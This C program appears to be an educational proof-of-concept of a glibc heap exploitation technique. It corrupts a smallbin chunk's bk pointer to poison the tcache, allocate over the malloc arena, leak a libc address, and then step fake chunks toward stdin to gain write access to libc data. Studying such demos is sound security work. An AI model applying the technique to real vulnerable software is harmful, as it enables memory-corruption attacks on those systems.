#include <stdlib.h>
#include <assert.h>
#include <stdio.h>

int main(int argc, char * argv[]){
	//the smallbin chunk we will overwrite the bk of
	char *victim = malloc(0x510);
	//the chunk we will overwrite in its tcache entry
	//its entry is the one immediately following the one
	//corresponding to victim size
	char *tcache_target = malloc(0x110);
	char *tcache = (char*)victim - 0x250;
	//chunk we will use to write a bin address in our 
	//allocated area in the arena
	char *freed = malloc(0x500);
	//to avoid consolidation with top
	char *guard = malloc(0x1000);
	//put victim in unsorted bin
	free(victim);
	//allocate a chunk that will be cut from victim 
	//the size of the remainder is 0x110(with metadata)
	char *trim_victim = malloc(0x400);
	//update victim to reflect the trim
	victim += 0x410;
	//the victim including metadata
	char **victim_chunk = (char **)victim-2;

	//free freed , it will be put in the unsorted bin
	free(freed);
	//this trims freed and sorts victim to its smallbin
	char *trim_freed = malloc(0x400);
	//update freed to reflect the trim
	freed += 0x410;
	//freed including metadata
	char **freed_chunk = (char **)freed-2;

	tcache += 0x40 + (int)(0x110/0x10 - 1 )*8 ;
	//sort freed into the small bin
	void *sort_freed = malloc(0x1000);
	//putting tcache_target in tcache
	free(tcache_target);

	//keep the address of the smallbin for later sanity check
	char *smallbin = victim_chunk[2];
	//keep the address of the leaked smallbin for later sanity check
	char *smallbin_leak_check = freed_chunk[2];

	//create a fake freelist on the heap , we can use 
	//the trim result for that
	char * (*freelist)[4] = (char * (*)[4])trim_victim;
	//links the fake list chunks
	for(int i=0; i<6; i++) {
		freelist[i][3] = (char*) freelist[i+1];
	}
	//to bypass the smallbin fd check
	freelist[0][2] = (char *) victim_chunk;


	//the address of the smallbin will be written to 
	//(freelist[6]->bk)->fd 
	freelist[6][3] = (void*)tcache-0x10;

	//------------VULNERABILITY-----------
	victim_chunk[3] = (char *)freelist[0]; 
	//------------------------------------

	//this allocates victim and starts filling tcache with chunks from
	//our freelist 
	char *p3 = malloc(0x100);
	//this allocates the smallbin address
	char **allocated = malloc(0x110);
	assert((long)allocated == (long)smallbin);
	//initialize where we landed with freed_chunk 
	//which we can calculate with the heap leak
	allocated[0] = allocated[1] = (char *)freed_chunk;

	//allocate size of freed to trigger the leak
	char *trigger_leak = malloc(0xf0);
	//the bin bins where we allocated now has bin addresses
	char *leak = allocated[0];
	assert((long)leak == (long)smallbin_leak_check);


	//now that we got a leak and we have read/write access to 
	//chunks , we'll demonstrate expansion

	char **bin2 = allocated;
	char **bin1 = allocated;
	char *alloc3 = NULL;
	//make sure we started before stdout
	assert((long)allocated < (long) stdout);
	char *backup[4];
	while ((void *)alloc3 < (void *)stdin + 0x300){
		bin2 += 28;
		//simulate a write
		//fake links of current bin to point to the next allocated one
		bin1[0] = bin1[1] = (char *) bin2;
		//backup bin2 contents to restore them and avoid crashes
		//we are overwriting ciritical libc data with our fake 
		//chunk , this goes with the assumption that the attacker can
		//read/write to malloced chunks , and bin2 chunk is entirely
		//within either bin1 or alloc3 , so no hidden dependencies
		for (int j = 0 ; j < 4 ; j++){
			backup[j] = bin2[j];
		}
		//fake sizes
		bin2[0] = bin2[1] = (char *) 0x100;
		//fake links of the next bin to point to point to current bin
		bin2[2] = bin2[3] = (char *) bin1-0x10;
		alloc3 = malloc(0xf0);
		assert((long)alloc3 == (long)bin2+0x10);
		//restore state
		for (int j = 0 ; j < 4 ; j++){
			bin2[j] = backup[j];
		}
		
	}
	//by now we reached beyond stdin+0x300 , which is not fat off the 
	//end of libc writable region
	exit(0);
}
